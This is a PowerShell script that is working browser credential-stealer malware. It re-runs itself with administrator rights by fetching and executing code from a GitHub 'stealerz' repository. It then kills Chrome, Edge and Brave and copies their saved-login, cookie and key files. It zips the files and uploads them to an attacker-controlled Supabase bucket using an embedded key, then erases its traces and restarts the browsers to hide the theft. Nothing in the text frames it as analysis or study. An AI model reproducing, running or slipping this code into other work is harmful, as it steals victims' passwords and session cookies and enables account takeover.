$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    $url = "https://raw.githubusercontent.com/KaloyanSyS32/stealerz/refs/heads/main/s.ps1"
    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"iex (irm '$url')`""
    exit
}

$sbUrl = "https://kjoxaevacnruadftkjxc.supabase.co/storage/v1/object/data/$($env:COMPUTERNAME)_creds.zip"
$sbKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imtqb3hhZXZhY25ydWFkZnRranhjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzgxNjA4NjAsImV4cCI6MjA5MzczNjg2MH0.OVuVfwrLPgxcrX3W0xjF-FVQBB9qMbMB1s-vL8aV_aY"

$staging = Join-Path $env:TEMP "tmp_$(Get-Random)"
New-Item -Path $staging -ItemType Directory -Force | Out-Null

$browserNames = @("chrome", "msedge", "brave")
$runningBrowsers = Get-Process -Name $browserNames -ErrorAction SilentlyContinue

# 1. Kill browsers
$runningBrowsers | Stop-Process -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 1

$browsers = @{
    "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    "Edge"   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    "Brave"  = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
}

foreach ($b in $browsers.GetEnumerator()) {
    if (Test-Path $b.Value) {
        $dest = New-Item -Path (Join-Path $staging $b.Key) -ItemType Directory -Force
        if (Test-Path "$($b.Value)\Local State") { Copy-Item "$($b.Value)\Local State" -Destination $dest -Force }
        
        Get-ChildItem -Path $b.Value -Recurse -File -ErrorAction SilentlyContinue | Where-Object { 
            $_.Name -eq "Login Data" -or $_.Name -eq "Cookies" 
        } | ForEach-Object {
            $subDest = Join-Path $dest $_.Directory.Name
            if (-not (Test-Path $subDest)) { New-Item $subDest -ItemType Directory -Force | Out-Null }
            Copy-Item $_.FullName -Destination $subDest -Force -ErrorAction SilentlyContinue
        }
    }
}

# 2. Immediate Restart of previously running browsers
foreach ($proc in $runningBrowsers) {
    try {
        Start-Process $proc.Path -ErrorAction SilentlyContinue
    } catch {
        # Fallback if path is lost
        Start-Process "$proc.name" -ErrorAction SilentlyContinue
    }
}

# 3. Compress and Exfiltrate
$zip = "$env:TEMP\c.zip"
if (Test-Path $zip) { Remove-Item $zip -Force }
Compress-Archive -Path "$staging\*" -DestinationPath $zip -Force

$headers = @{ 
    "Authorization" = "Bearer $sbKey"
    "apikey" = $sbKey
    "Content-Type" = "application/zip"
    "x-upsert" = "true" 
}

$bytes = [System.IO.File]::ReadAllBytes($zip)
Invoke-RestMethod -Uri $sbUrl -Method Post -Headers $headers -Body $bytes

# Cleanup
Remove-Item $staging -Recurse -Force
Remove-Item $zip -Force
